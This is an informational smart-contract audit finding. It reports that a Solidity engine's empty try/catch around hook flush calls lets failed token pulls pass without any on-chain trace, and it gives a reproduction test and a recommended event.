### 11. Info: fire's nested try/catch around flush and flushHolders is safe but silent: a pull that fails every time leaves no on-chain trace

`src/pimd/PimdEngine.sol:356`

```
                try hook.flushHolders() {} catch {}
```

Answer to the brief's question on the pattern. It is safe in the ways that matter: the hook is bound only after bind verified it answers engine()/quote()/token()/poolManager(), so there is no codeless target or return-decoding failure that escapes the catch; the hook's unlock closes before flush returns, so _book and the epoch run with the PoolManager locked; a reentrant call into the engine from inside flush is blocked by nonReentrant; and the 63/64 rule means a caller cannot starve flush into the catch while keeping enough gas to finish fire. The weakness that hid one breakage before is unchanged: both catches are empty. If IMD ever refuses the engine, or the hook reverts for any other reason, fire succeeds, books no income, opens an epoch on the existing pot and emits only Fired, so the chain state is indistinguishable from a quiet market while holdersOwed grows at the hook. Recommend emitting an event carrying the pending amount in the inner catch; no behavioural change. From audit_math, confirmed.

**Reproduction**

Harness as test/pimd/PimdBase.t.sol. alice buys 200 IMD of PIMD and registers; hook.holdersOwed() > 0. vm.mockCallRevert(imd, transfer(engine, *)) so both flush and flushHolders revert. Warp 2 days, keeper calls fire(): it does not revert, totalIncome() == 0, hook.holdersOwed() is unchanged, no event other than Fired. Expected for an unattended keeper: a visible signal that the pull failed. test/scratch/Leads.t.sol::test_fire_succeeds_silently_when_both_pulls_revert passes, i.e. the behaviour reproduces.

---

Judge's submission `e3d39d2909e5ff6b90b8fde3e97d82cede99b3c6d044b7652843f094f6a3eed9`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
